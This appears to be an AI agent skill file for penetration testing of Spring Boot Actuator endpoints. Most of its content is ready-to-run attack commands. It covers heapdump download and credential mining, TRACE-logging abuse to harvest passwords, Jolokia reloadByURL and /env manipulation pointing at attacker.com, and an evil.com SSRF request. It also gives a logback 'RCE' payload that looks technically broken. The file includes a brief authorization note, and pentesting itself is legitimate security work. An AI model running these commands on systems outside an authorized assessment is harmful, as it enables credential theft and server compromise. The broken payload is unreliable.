---
name: spring-actuator-pentest
description: Spring Boot Actuator exploitation for penetration testing. Use this skill whenever you need to assess Spring Boot applications for actuator misconfigurations, extract secrets from heapdumps, abuse logging endpoints for credential capture, or test for RCE via Jolokia. Trigger this skill for any Spring Boot security assessment, actuator endpoint enumeration, JVM heap analysis, or when investigating exposed /actuator endpoints on target systems.
---

# Spring Boot Actuator Pentesting

A comprehensive skill for exploiting Spring Boot Actuator misconfigurations during security assessments.

## Overview

Spring Boot Actuators expose operational endpoints that can leak sensitive data or enable remote code execution when misconfigured. This skill covers:

- **Endpoint enumeration** - Discover exposed actuator endpoints
- **Secret extraction** - Mine credentials from heapdumps
- **Logging abuse** - Capture credentials via verbose logging
- **RCE exploitation** - Exploit Jolokia and environment manipulation

## Quick Start

```bash
# Enumerate actuator endpoints
curl -s http://target/actuator | jq .

# Check for heapdump exposure
curl -s http://target/actuator/heapdump -O heapdump

# Extract secrets from heapdump
./scripts/extract-heapdump-secrets.sh heapdump
```

## Endpoint Enumeration

### Default Actuator Endpoints

Spring Boot registers these endpoints by default:

| Endpoint | Purpose | Risk Level |
|----------|---------|------------|
| `/health` | Application health | Low |
| `/info` | Application info | Low |
| `/env` | Environment properties | **High** |
| `/beans` | Spring beans | Medium |
| `/trace` | HTTP request trace | Medium |
| `/logfile` | Log file contents | **High** |
| `/loggers` | Logger configuration | **High** |
| `/heapdump` | JVM heap snapshot | **Critical** |
| `/jolokia` | JMX over HTTP | **Critical** |
| `/mappings` | URL mappings | Medium |
| `/dump` | Thread dump | Medium |
| `/shutdown` | Application shutdown | **Critical** |
| `/restart` | Application restart | **Critical** |
| `/httpexchanges` | HTTP exchange history | **High** |
| `/configprops` | Configuration properties | Medium |

### Version Differences

- **Spring Boot 1.x**: Actuators at root path (`/env`, `/health`)
- **Spring Boot 2.x+**: Actuators under `/actuator/` prefix (`/actuator/env`, `/actuator/health`)

### Enumeration Script

Use the enumeration script to discover all exposed endpoints:

```bash
./scripts/enumerate-actuators.sh http://target:8080
```

This script:
1. Checks for `/actuator` and root-level endpoints
2. Tests common actuator paths
3. Reports accessible endpoints with status codes
4. Identifies version (1.x vs 2.x) based on path structure

## Heapdump Secrets Mining

When `/actuator/heapdump` is exposed, you can retrieve a full JVM heap snapshot containing live secrets.

### Quick Extraction

```bash
# Download heapdump
curl -s http://target/actuator/heapdump -O heapdump

# Extract secrets using the script
./scripts/extract-heapdump-secrets.sh heapdump
```

### Manual Extraction

```bash
# Quick wins: search for common credential patterns
strings -a heapdump | grep -nE 'Authorization: Basic|jdbc:|password=|spring\.datasource|eureka\.client'

# Decode Base64 credentials
printf %s 'BASE64_STRING' | base64 -d
```

### High-Value Targets

Look for these patterns in heapdumps:

- **Database credentials**: `DataSourceProperties`, `HikariDataSource` objects
- **API keys**: `OriginTrackedMapPropertySource` entries
- **Basic Auth**: `Authorization: Basic` headers in memory
- **Service URLs**: Eureka `defaultZone` with embedded credentials
- **Spring properties**: `management.endpoints.web.exposure.include`

### VisualVM Analysis

For deeper analysis, open the heapdump in VisualVM and run OQL queries:

```sql
select s.toString() 
from java.lang.String s 
where /Authorization: Basic|jdbc:|password=|spring\.datasource|eureka\.client|OriginTrackedMapPropertySource/i.test(s.toString())
```

### JDumpSpider

Automated extraction with JDumpSpider:

```bash
java -jar JDumpSpider-*.jar heapdump
```

## Logging Abuse for Credential Capture

When `/actuator/loggers` is exposed, you can increase log levels to capture credentials from authentication flows.

### Enable Verbose Logging

```bash
# List available loggers
curl -s http://target/actuator/loggers | jq .

# Enable TRACE for security packages
./scripts/configure-loggers.sh http://target TRACE org.springframework.security org.springframework.web
```

### Manual Configuration

```bash
# Enable TRACE for Spring Security
curl -s -X POST http://target/actuator/loggers/org.springframework.security \
     -H 'Content-Type: application/json' \
     -d '{"configuredLevel":"TRACE"}'

# Enable TRACE for Spring Web
curl -s -X POST http://target/actuator/loggers/org.springframework.web \
     -H 'Content-Type: application/json' \
     -d '{"configuredLevel":"TRACE"}'

# Enable TRACE for Spring Cloud Gateway
curl -s -X POST http://target/actuator/loggers/org.springframework.cloud.gateway \
     -H 'Content-Type: application/json' \
     -d '{"configuredLevel":"TRACE"}'
```

### Harvest Credentials from Logs

```bash
# Read logs from actuator
curl -s http://target/actuator/logfile | strings | grep -nE 'Authorization:|username=|password='

# Find log file path from environment
curl -s http://target/actuator/env | jq '.propertySources[].properties | to_entries[] | select(.key|test("^logging\\.(file|path)"))'
```

### Reset Log Levels

Always reset log levels after testing:

```bash
./scripts/configure-loggers.sh http://target null org.springframework.security org.springframework.web
```

Or manually:

```bash
curl -s -X POST http://target/actuator/loggers/org.springframework.security \
     -H 'Content-Type: application/json' \
     -d '{"configuredLevel":null}'
```

## Remote Code Execution via Jolokia

The `/jolokia` endpoint exposes JMX over HTTP and can enable RCE through the `reloadByURL` action.

### Test for Jolokia RCE

```bash
./scripts/test-jolokia-rce.sh http://target:8080
```

### Manual Exploitation

```bash
# Test Jolokia availability
curl -s http://target/jolokia/list

# Exploit reloadByURL for RCE
curl -s 'http://target/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http://attacker.com/logback.xml'
```

### Crafted logback.xml Payload

```xml
<configuration>
  <appender name="RCE" class="ch.qos.logback.core.net.SMTPAppender">
    <personal>$(whoami)</personal>
  </appender>
  <root level="INFO">
    <appender-ref ref="RCE"/>
  </root>
</configuration>
```

## Environment Manipulation via /env

When Spring Cloud Libraries are present, the `/env` endpoint allows property modification.

### Modify Properties

```bash
# Spring Boot 1.x (form-encoded)
curl -s -X POST http://target/env \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'eureka.client.serviceUrl.defaultZone=http://attacker.com/n/xstream'

# Spring Boot 2.x (JSON)
curl -s -X POST http://target/actuator/env \
     -H 'Content-Type: application/json' \
     -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://attacker.com/n/xstream"}'
```

### Dangerous Properties

These properties can be manipulated for various exploits:

- `spring.datasource.tomcat.url` - Database connection string
- `spring.datasource.tomcat.username` - Database credentials
- `spring.datasource.tomcat.password` - Database password
- `spring.datasource.tomcat.validationQuery` - SQL injection vector
- `eureka.client.serviceUrl.defaultZone` - XStream deserialization

## SSRF via Matrix Parameters

Spring's handling of matrix parameters (`;`) in HTTP paths can enable SSRF.

### Exploit Request

```http
GET ;@evil.com/path HTTP/1.1
Host: target.com
Connection: close
```

Or with curl:

```bash
curl -s 'http://target.com/;@evil.com/path' -H 'Host: target.com'
```

## Workflow Recommendations

### Initial Reconnaissance

1. Enumerate all actuator endpoints
2. Check for `/actuator` vs root-level endpoints (version detection)
3. Test for `/heapdump` exposure
4. Check `/env` and `/loggers` accessibility

### Secret Extraction

1. Download heapdump if available
2. Run extraction script for quick wins
3. Use VisualVM for deeper analysis
4. Test extracted credentials on adjacent services

### Credential Capture

1. Enable TRACE logging for security packages
2. Trigger authentication traffic
3. Harvest credentials from logs
4. Reset log levels when done

### RCE Testing

1. Check for `/jolokia` endpoint
2. Test `reloadByURL` action
3. Attempt environment manipulation via `/env`
4. Test matrix parameter SSRF

## Safety and Ethics

- Only test systems you have authorization to assess
- Reset log levels after testing to avoid performance impact
- Document all findings and remediation recommendations
- Be aware that heapdumps may contain PII requiring special handling

## References

- [Exploring Spring Boot Actuator Misconfigurations (Wiz)](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)
- [Exploiting Spring Boot Actuators (VeraCode)](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [VisualVM](https://visualvm.github.io/)
- [JDumpSpider](https://github.com/whwlsfb/JDumpSpider)
- [SecLists Spring Boot wordlist](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)
- [Remote Code Execution in Three Acts (Spaceraccoon)](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)
